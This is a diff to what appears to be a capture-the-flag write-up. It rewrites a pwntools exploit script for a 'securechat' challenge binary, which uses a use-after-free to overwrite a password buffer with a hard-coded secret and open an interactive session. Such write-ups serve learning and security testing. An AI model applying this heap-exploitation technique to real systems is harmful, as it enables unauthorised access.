@@ -139,49 +139,82 @@ verify_password():
 
 ---
 
-## Exploit Script (Pwntools)
+## Exploit script
 
 ```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
 from pwn import *
 
-elf = ELF('./securechat')
-p   = process(elf.path)
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'main')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:      No RELRO
+# Stack:      No canary found
+# NX:         NX enabled
+# PIE:        PIE enabled
+# Packer:     Packed with UPX
+
+io = start()
 
 def new_chat(idx, name, msg):
-    p.sendlineafter('> ', '1')
-    p.sendlineafter('Index (0-9): ', str(idx))
-    p.sendafter('Name of the chat: ', name.ljust(0x40, b'\x00'))
-    p.sendafter('reply ASAP :', msg)
+    io.sendlineafter(b'> ', b'1')
+    io.sendlineafter(b'Index (0-9): ', str(idx).encode())
+    io.sendafter(b'Name of the chat: ', name.ljust(0x40, b'\x00'))
+    io.sendafter(b'reply ASAP :', msg)
 
 def delete_chat(idx, confirm):
-    p.sendlineafter('> ', '2')
-    p.sendlineafter('Index (0-9): ', str(idx))
-    p.sendafter('(Y/N):', confirm)
+    io.sendlineafter(b'> ', b'2')
+    io.sendlineafter(b'Index (0-9): ', str(idx).encode())
+    io.sendafter(b'(Y/N):', confirm)
 
 def rename_chat(idx, new_name):
-    p.sendlineafter('> ', '3')
-    p.sendlineafter('Index (0-9): ', str(idx))
-    p.sendafter('Name of the chat: ', new_name.ljust(0x40, b'\x00'))
+    io.sendlineafter(b'> ', b'3')
+    io.sendlineafter(b'Index (0-9): ', str(idx).encode())
+    io.sendafter(b'Name of the chat: ', new_name.ljust(0x40, b'\x00'))
 
 def verify_password():
-    p.sendlineafter('> ', '7')
+    io.sendlineafter(b'> ', b'7')
 
-# 1) Create chat at index 0
-new_chat(0, b'A'*8, b'HELLO')
+new_chat(0, b'dexter', b'dexter')
 
-# 2) Free name chunk but cancel deleting chat
 delete_chat(0, b'N')
 
-# 3) Allocate password buffer (s1) reusing freed chunk
-p.sendlineafter('> ', '5')
+io.sendlineafter(b'> ', b'5')
 
-# 4) Overwrite password buffer with correct secret
 rename_chat(0, b'53cr37_c0d3')
 
-# 5) Trigger verification to pop shell/log
 verify_password()
 
-p.interactive()
+io.interactive()
+
 ```
 
 ---
